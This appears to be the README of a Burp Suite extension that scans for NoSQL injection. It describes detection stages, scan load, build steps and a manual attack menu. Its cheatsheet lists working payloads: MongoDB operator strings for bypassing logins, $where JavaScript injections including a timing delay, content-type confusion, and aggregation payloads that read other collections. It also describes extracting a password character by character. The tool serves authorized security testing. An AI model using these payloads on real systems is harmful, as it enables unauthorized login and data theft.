# 🔍 NoSQLi Hunter - Burp Suite Extension v2.1.1

> **Professional-grade NoSQL Injection scanner for Burp Suite Community & Pro**
> Built for bug hunters with 15+ years of web app experience in mind.
> Detection engine designed to minimize false positives: error signatures are
> checked against the baseline, blind-boolean findings require 2+ agreeing
> payload pairs, and time-based findings require a second confirmation.
> Always manually verify a finding before reporting it.

---

## 📋 Features

### 🧠 Smart Body Type Detection
Automatically detects and handles all request formats:
- `application/json` — JSON operator injection
- `application/x-www-form-urlencoded` — URL-encoded PHP-style (`param[$ne]=x`)
- `multipart/form-data` — Form field injection
- GET query parameters — URL query string injection
- GraphQL — JSON body with operator injection
- Content-Type Confusion — Upgrades urlencoded → JSON operators

### 🎯 Attack Techniques (All Covered)

| Technique | Description | FP Risk |
|-----------|-------------|---------|
| **Error-Based** | Inject `'`, `"`, `\`, `;`, `{`, `}`, `$` — look for DB errors | None — Confirmed |
| **Blind Boolean** | `$ne` vs exact match — compare response size/status | Low — 2 pairs required |
| **Time-Based SSJS** | JavaScript `while(new Date()-t<3000)` delay | Low — 2 confirmations |
| **Auth Bypass** | `$ne null`, `$gt ""`, `$regex .*` on login forms | N/A — Manual verification |
| **Operator Injection** | All MongoDB operators: `$ne,$gt,$lt,$gte,$lte,$in,$nin,$regex,$exists,$type,$where` | Low |
| **Content-Type Confusion** | Upgrade urlencoded→JSON to bypass operator filtering (urlencoded bodies only) | Low |
| **Aggregation Pipeline** | `$lookup`, `$unionWith` to access other collections (read-only — `$out` is never sent) | Low |
| **Mongoose CVE-2025-23061** | `$where` nested under `$or` to bypass sanitizeFilter, merged alongside the original fields | N/A |
| **Data Extraction** | Opt-in `$regex` prefix search — extracts a password char-by-char (urlencoded + JSON) | N/A — opt-in, cancellable |

### 🚫 False Positive Prevention Strategy

**Stage 1 — Error Detection:**
Error signatures must appear in the injected response but NOT in the baseline response.

**Stage 2 — Boolean Detection:**
- Requires **2+ independent payload pairs** to show consistent differential behavior
- Threshold: >15% response size/content difference
- The differential must **reproduce on resend** — one-shot diffs are skipped
- Bodies are normalized first: the reflected payload (pair and bare value)
  and per-request tokens (CSRF/nonces/timestamps) are stripped, so only
  real behavior differs

**Stage 3 — Time-Based:**
- Measured elapsed time must be ≥ 2500ms
- Must exceed the baseline average (3 samples) by ≥ 2000ms — slow endpoints
  (baseline > 2s) stay testable instead of being mathematically undetectable
- Confirmed with a **second independent request** before reporting

**Passive Audit:**
Only unambiguous DB error signatures (`MongoError`, `BSONTypeError`,
`CastError`, `MongooseError`, …) are matched. Generic terms that appear on any
MongoDB-backed site — including the word "MongoDB" itself — are deliberately
excluded, so describing your stack or sending an `X-Powered-By` header will not
create a finding.

**Reporting tiers:**
A CRITICAL finding means positive evidence of success — success keywords, an
auth-success redirect, or a success status change. Weaker signals are reported
as MEDIUM **leads** instead: the failure text merely disappearing on an
operator payload (`AUTH-BYPASS-LEAD` — often just different validation
wording), or a healthy endpoint erroring on operator payloads
(`OPERATOR-ERROR` — the operators reached the query). Verify leads manually in
Repeater before reporting anything.

### ⚠️ Scan Load Awareness

One active-scan insertion point costs up to ~50 requests (11 error-based +
up to 24 boolean including stability resends + up to 19 time-based including
baseline and confirmations), with a
150 ms pause between requests. The time-based payloads, when they execute,
burn ~3 s of server-side CPU per request. On targets with many parameters this
is real load — scope your scans and respect the engagement's rate limits.
The right-click **"🚀 Full NoSQL Injection Scan"** sends a comparable volume
per parameter and is meant for a single hand-picked request.

---

## 🏗️ Project Structure

```
nosqli-hunter/
├── src/main/java/nosqli/
│   ├── NoSQLiScanner.java      # Extension entry point (BurpExtension)
│   ├── PayloadDatabase.java    # All payloads organized by type
│   ├── SmartBodyDetector.java  # Body type detection & parameter extraction
│   ├── NoSQLiScanCheck.java    # Core detection engine (active+passive scan)
│   ├── NoSQLiContextMenu.java  # Right-click manual attack menu
│   ├── NoSQLiTab.java          # Burp Suite UI tab (findings, log, cheatsheet)
│   ├── DiffEngine.java         # Differential analysis + response normalization
│   ├── JsonWalker.java         # Zero-dependency JSON leaf walker
│   ├── ScanState.java          # Per-host scan locks + cancellation
│   └── FindingsLogger.java     # Shared findings/log bus (scans + tab)
├── src/test/java/nosqli/       # JUnit 5: DiffEngine, JsonWalker, ScanState
├── test-target/                # Local vulnerable Node+Mongo app (docker compose)
├── TESTING.md                  # Lab regression list + manual checklist
├── build.gradle
├── settings.gradle
└── README.md
```

---

## 🔧 Build & Install

### Requirements
- Java 17+
- Gradle 7+
- Burp Suite Community or Professional

### Build
```bash
cd nosqli-burp-extension
gradle buildExtension
# Output: build/libs/nosqli-hunter-2.1.1.jar

# Run the JUnit suite (pure detection logic, no Burp needed)
gradle test
```

### Install in Burp
1. Open Burp Suite
2. Go to **Extensions → Installed → Add**
3. Extension Type: **Java**
4. Extension file: select `nosqli-hunter-2.1.1.jar`
5. Click **Next** — look for "NoSQLi Hunter v2.1.1 - Loaded" in the Output tab

> **Burp Community users:** the right-click attack menu and the NoSQLi Hunter
> tab work fully on Community. Only the automated active/passive auditing
> needs Burp Pro — on Community the extension loads normally, logs a notice,
> and skips scanner registration.

---

## 🚀 Usage

### Method 1: Active Scan (Automated)
1. Browse the target through Burp Proxy
2. Right-click any request in HTTP history
3. Select **"Do active scan"**
4. NoSQLi Hunter automatically tests all parameters

### Method 2: Right-Click Manual Menu
Right-click any request in HTTP history, Repeater, or Target:

```
🔍 NoSQLi Hunter
├── 📋 Body Type: [detected type]
├── 🔓 Authentication Bypass
│   ├── URL-Encoded ($ne, $gt, $regex, $nin, $in, $exists)
│   └── JSON Operator Bypass
├── ⚙️ Operator Injection Scan
├── 💻 JavaScript Injection ($where)
├── 🔎 Extract Field Data ($regex, opt-in)
├── ⏱️ Time-Based Blind (3s delay)
├── 🔄 Content-Type Confusion (→ JSON ops, urlencoded only)
├── 🗄️ Aggregation Pipeline Injection
├── 🐍 Mongoose CVE-2025-23061 ($where via $or)
└── 🚀 Full NoSQL Injection Scan (All Techniques)
```

### Method 3: Passive Scan
The extension passively monitors proxied responses for unambiguous MongoDB
error leakage. (CouchDB signatures are checked in the active error stage,
where a baseline response exists for comparison.)

---

## 📊 Payload Reference (Cheatsheet)

### URL-Encoded Operator Injection
```
# Not Equal (auth bypass)
username[$ne]=toto&password[$ne]=toto

# Greater Than (empty string)
username[$gt]=&password[$gt]=

# Regex match all
login[$regex]=a.*&pass[$ne]=lol

# Not In array
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto

# In array (try common usernames)
user[$in][]=Admin&user[$in][]=admin&user[$in][]=root&pass[$ne]=nosqli

# Exists
username[$exists]=true&password[$exists]=true
```

### JSON Body Operator Injection
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$ne": "x"}}
{"username": {"$in": ["admin","root","administrator"]}, "password": {"$gt": ""}}
{"username": {"$exists": true}, "password": {"$exists": true}}
```

### JavaScript Injection ($where)
```javascript
' || '1'=='1
'; return true; var x='
0; return true
1==1
// Time-based (safe 3s)
'; var t=new Date(); do{}while(new Date()-t<3000); var x='
```

### Content-Type Confusion
```
# Original request (urlencoded)
POST /login
Content-Type: application/x-www-form-urlencoded
user=admin&pass=wrong

# Modified request (JSON operators)
POST /login
Content-Type: application/json
{"user": {"$ne": null}, "pass": {"$ne": null}}
```

### Aggregation Pipeline (MongoDB 5+)
```json
{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}}
{"$unionWith": {"coll": "users", "pipeline": []}}
```

---

## 🔬 Detection Logic Details

### MongoDB Error Signatures Detected
```
MongoError, BSONTypeError, CastError, MongooseError, ValidationError,
"failed to parse", "invalid operator", "unknown operator", BadValue,
SyntaxError, ReferenceError, "Cast to ObjectId failed", OperationFailure
```

### Boolean Confirmation Algorithm
```
baseline = send(original_request)
for each (true_payload, false_payload) pair:
    true_resp  = send(inject(true_payload))
    false_resp = send(inject(false_payload))

    # normalize both bodies first: strip the reflected payload
    # (pair AND bare value) + dynamic tokens (csrf/nonce/timestamps)
    size_diff    = |true_len - false_len| / avg > 15%
    status_diff  = true_status != false_status
    path_diff    = redirect paths differ
    keyword_diff = auth keywords flip sides

    if (size_diff OR status_diff OR path_diff OR keyword_diff):
        resend both sides — the differential must reproduce
        if reproduced: confirmed_count++

if confirmed_count >= 2:
    REPORT (FIRM confidence)
```

### Time-Based Algorithm
```
baseline = avg(3 × send(original_request)) in ms

for each time_payload:
    elapsed = time(send(inject(payload)))

    # baseline-aware: the sleep adds ~3s ON TOP of normal latency
    if elapsed >= 2500ms AND (elapsed - baseline) >= 2000ms:
        confirm_elapsed = time(send(inject(payload)))  # second shot

        if confirm_elapsed >= 2500ms AND (confirm_elapsed - baseline) >= 2000ms:
            REPORT (FIRM confidence)
```

---

## 🐛 CVE Coverage

| CVE | Description | Covered |
|-----|-------------|---------|
| CVE-2025-23061 | Mongoose $where bypass via $or nesting | ✅ |
| CVE-2024-50672 | eLearning Platform - Mongoose find() NoSQLi | ✅ via operator scan |
| CAPEC-676 | NoSQL Injection (general) | ✅ |
| CWE-943 | Improper Neutralization of Special Elements | ✅ |

---

## 📚 References

- [OWASP Testing Guide - NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [MongoDB NoSQL Injection with Aggregation Pipelines - Soroush Dalili (2024)](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
- [PortSwigger Web Security Academy - NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
- [NoSQLi error-based injection - SensePost (2025)](https://sensepost.com/blog/2025/nosql-error-based-injection/)
- [Mongoose CVE-2025-23061 - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html)
- [cr0hn/nosqlinjection_wordlists](https://github.com/cr0hn/nosqlinjection_wordlists)

---

## ⚠️ Legal Disclaimer

This tool is for authorized penetration testing and security research only.
Use only on systems you own or have explicit written permission to test.
The authors are not responsible for misuse.

---

*Built with ❤️ for the security community — by bug hunters, for bug hunters.*
